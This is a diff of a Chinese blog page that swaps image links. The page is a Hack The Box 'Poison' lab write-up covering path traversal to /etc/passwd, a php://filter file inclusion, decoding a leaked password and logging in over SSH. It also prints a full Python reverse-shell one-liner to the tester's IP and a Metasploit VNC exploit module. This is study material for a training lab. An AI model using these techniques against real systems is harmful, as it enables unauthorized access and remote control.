@@ -224,8 +224,8 @@
               <h4 id="1-端口扫描"><a href="#1-端口扫描" class="headerlink" title="1. 端口扫描"></a>1. 端口扫描</h4><p>ip: 10.10.10.84</p>
 <figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver"><span class="hljs-number">22</span>/tcp   <span class="hljs-built_in">open</span>  ssh<br><span class="hljs-number">80</span>/tcp   <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span><br><span class="hljs-number">5802</span>/tcp <span class="hljs-built_in">open</span>  vnc-<span class="hljs-keyword">http</span><span class="hljs-number">-2</span><br><span class="hljs-number">5902</span>/tcp <span class="hljs-built_in">open</span>  vnc<span class="hljs-number">-2</span><br><span class="hljs-number">5903</span>/tcp <span class="hljs-built_in">open</span>  vnc<span class="hljs-number">-3</span><br><span class="hljs-number">6002</span>/tcp <span class="hljs-built_in">open</span>  X11:<span class="hljs-number">2</span><br><span class="hljs-number">6003</span>/tcp <span class="hljs-built_in">open</span>  X11:<span class="hljs-number">3</span><br></code></pre></div></td></tr></table></figure>
 <p>嗯，确认是linux系统</p>
-<h4 id="2-web探测"><a href="#2-web探测" class="headerlink" title="2. web探测"></a>2. web探测</h4><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0928/2.PNG" srcset="/img/loading.gif" alt="2"><br>一看到浏览器上的URL：<code>file=xxx</code>，就富有职业精神的输入<code>../../../../../etc/passwd</code></p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0928/3.PNG" srcset="/img/loading.gif" alt="啊哈~一个文件包含"></p>
+<h4 id="2-web探测"><a href="#2-web探测" class="headerlink" title="2. web探测"></a>2. web探测</h4><p><img src="2.PNG" srcset="/img/loading.gif"><br>一看到浏览器上的URL：<code>file=xxx</code>，就富有职业精神的输入<code>../../../../../etc/passwd</code></p>
+<p><img src="3.PNG" srcset="/img/loading.gif"></p>
 <blockquote>
 <p>Info1——机器上普通用户名称:<br> hast:<em>:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin<br>nobody:</em>:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin<br>_tss:<em>:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin<br>messagebus:</em>:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin<br>avahi:<em>:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin<br>charix:</em>:1001:1001:charix:/home/charix:/bin/csh</p>
 </blockquote>
@@ -233,8 +233,8 @@
 <blockquote>
 <p>Info2——文件路径：<br>Warning: include(php://filter/convert.base64-encode/resource=config.php): failed to open stream: operation failed in /usr/local/www/apache24/data/browse.php on line 2<br>Warning: include(): Failed opening ‘php://filter/convert.base64-encode/resource=config.php’ for inclusion (include_path=’.:/usr/local/www/apache24/data’) in /usr/local/www/apache24/data/browse.php on line 2</p>
 </blockquote>
-<p>于是用php协议，访问browse.php，用hackbar解码一下。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0928/4.PNG" srcset="/img/loading.gif" alt="4"><br>本来想用dirbuster扫描下存在的文件，再用文件包括去查看敏感文件。。。<br>但是，这个实验中，主页面上有一个listfiles.php，访问以后，直接指出了一个pwdbackup.txt。</p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0928/5.PNG" srcset="/img/loading.gif" alt="5"><br>上面说这个密码很安全，它被加密了13次。真的还能出什么问题。<br>然后我一看，我去，base64编码还好意思说安全，加密13次又有什么意义吗？<br>我还是太菜，手动把密文的\n去掉，然后再解码，很多次解码后，密码为：<code>Charix!2#4%6&amp;8(0</code></p>
+<p>于是用php协议，访问browse.php，用hackbar解码一下。<br><img src="4.PNG" srcset="/img/loading.gif"><br>本来想用dirbuster扫描下存在的文件，再用文件包括去查看敏感文件。。。<br>但是，这个实验中，主页面上有一个listfiles.php，访问以后，直接指出了一个pwdbackup.txt。</p>
+<p><img src="5.PNG" srcset="/img/loading.gif"><br>上面说这个密码很安全，它被加密了13次。真的还能出什么问题。<br>然后我一看，我去，base64编码还好意思说安全，加密13次又有什么意义吗？<br>我还是太菜，手动把密文的\n去掉，然后再解码，很多次解码后，密码为：<code>Charix!2#4%6&amp;8(0</code></p>
 <p>方法二：<br>sed -i ‘s/\n//g’ pwdbackup.txt</p>
 <blockquote>
 <p>Info3——口令<br>Charix!2#4%6&amp;8(0</p>
@@ -242,11 +242,11 @@
 <ul>
 <li>Trying:<br><code>ssh charix@10.10.10.84</code></li>
 </ul>
-<p>charix/Charix!2#4%6&amp;8(0<br><strong>ssh登陆成功</strong><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0928/6.PNG" srcset="/img/loading.gif" alt="6"></p>
+<p>charix/Charix!2#4%6&amp;8(0<br><strong>ssh登陆成功</strong><br><img src="6.PNG" srcset="/img/loading.gif"></p>
 <h4 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a><strong>3.提权</strong></h4><p>/home/charix目录下有三个文件，一个flag；一个secret，是空文件；还有一个secret.zip。<br>那么需要解压一下，tar -zxvf secret.zip<br>提示<code>x secretEnter passphrase:</code><br>那么需要输入密码，然后尝试错误密码，会反复提示<code>Enter passphrase</code>。<br>通过Info3口令，成功解压。<br>解压后是secret文件，类型为：<code>secret: Non-ISO extended-ASCII text, with no line terminators</code></p>
 <p>用cat secret，显示为乱码。</p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0928/7.PNG" srcset="/img/loading.gif"></p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0928/8.png" srcset="/img/loading.gif" alt="vi secret"></p>
+<p><img src="7.PNG" srcset="/img/loading.gif"></p>
+<p><img src="8.png" srcset="/img/loading.gif"></p>
 <ul>
 <li><p>sudo、gcc———–&gt;command not found</p>
 </li>
@@ -261,11 +261,11 @@
 </ul>
 <p>有意思的是，在连接过程中，ssh命令面板突然不灵了，无法输入任何命令。<br>重新连进去以后，我的readme.txt多了一行。。。看来遇到同道中人了。</p>
 <ul>
-<li>Trying：测试nc，用服务端连接kali。成功连接。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0928/%E6%8D%95%E8%8E%B7%202.PNG" srcset="/img/loading.gif"></li>
+<li>Trying：测试nc，用服务端连接kali。成功连接。<br><img src="%E6%8D%95%E8%8E%B7%202.PNG" srcset="/img/loading.gif"></li>
 </ul>
 <p>不是吧。。又连不上了，第一次遇到被人挤下线。</p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0928/%E6%8D%95%E8%8E%B7%203.PNG" srcset="/img/loading.gif"></p>
-<p>查看一下进程这些都是远程连进来的。。。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0928/%E6%8D%95%E8%8E%B7%204.PNG" srcset="/img/loading.gif"></p>
+<p><img src="%E6%8D%95%E8%8E%B7%203.PNG" srcset="/img/loading.gif"></p>
+<p>查看一下进程这些都是远程连进来的。。。<br><img src="%E6%8D%95%E8%8E%B7%204.PNG" srcset="/img/loading.gif"></p>
 <ul>
 <li><p>Trying：太卡了，弹一个python shell。<br>本地：<code>nc -lvp 1234</code><br>服务器：<code>python ‐c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.198&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;‐i&quot;]);&#39;</code></p>
 </li>
@@ -274,18 +274,18 @@
 <li><p>Trying：</p>
 </li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0928/%E6%89%BE%E5%88%B0%E7%BD%91%E7%AB%99%E6%89%80%E5%9C%A8%E7%9B%AE%E5%BD%95.png" srcset="/img/loading.gif" alt="找到网站所在目录"></p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0928/3%E6%9D%83%E9%99%90%E4%B8%8D%E5%A4%9F.png" srcset="/img/loading.gif" alt="3权限不够"></p>
+<p><img src="%E6%89%BE%E5%88%B0%E7%BD%91%E7%AB%99%E6%89%80%E5%9C%A8%E7%9B%AE%E5%BD%95.png" srcset="/img/loading.gif"></p>
+<p><img src="3%E6%9D%83%E9%99%90%E4%B8%8D%E5%A4%9F.png" srcset="/img/loading.gif"></p>
 <ul>
-<li>Trying:<br>尝试vnc远程命令执行<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0928/9.PNG" srcset="/img/loading.gif" alt="查看开放端口"></li>
+<li>Trying:<br>尝试vnc远程命令执行<br><img src="9.PNG" srcset="/img/loading.gif"></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0928/4netstat.PNG" srcset="/img/loading.gif" alt="netstat"></p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0928/%E6%8D%95%E8%8E%B7%205.PNG" srcset="/img/loading.gif" alt="尝试vnc远程命令执行"></p>
+<p><img src="4netstat.PNG" srcset="/img/loading.gif"></p>
+<p><img src="%E6%8D%95%E8%8E%B7%205.PNG" srcset="/img/loading.gif"></p>
 <figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">use exploit/multi/vnc/vnc_keyboard_exec<br><span class="hljs-builtin-name">set</span> RHOST<br><span class="hljs-builtin-name">set</span> PASSWORD<br></code></pre></div></td></tr></table></figure>
 
 <p>试了好多密码，包括里面secret文件。失败</p>
 <h4 id="2018-9-28-总结"><a href="#2018-9-28-总结" class="headerlink" title="2018.9.28.总结"></a>2018.9.28.总结</h4><p><a target="_blank" rel="noopener" href="http://www.hackingarticles.in/hack-the-box-poison-walkthrough/">writeup参考</a></p>
-<p><a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2011/12/ssh_port_forwarding.html">SSH原理与运用（二）：远程操作与端口转发</a><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0928/01.PNG" srcset="/img/loading.gif" alt="01"></p>
+<p><a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2011/12/ssh_port_forwarding.html">SSH原理与运用（二）：远程操作与端口转发</a><br><img src="01.PNG" srcset="/img/loading.gif"></p>
 <p><strong>通过绑定本地和远程的端口，就可以用vncviewer命令，使用密钥，开启vnc窗口</strong><br>vncviewer  -passwd secret  127.0.0.1:5901</p>
 
             </div>
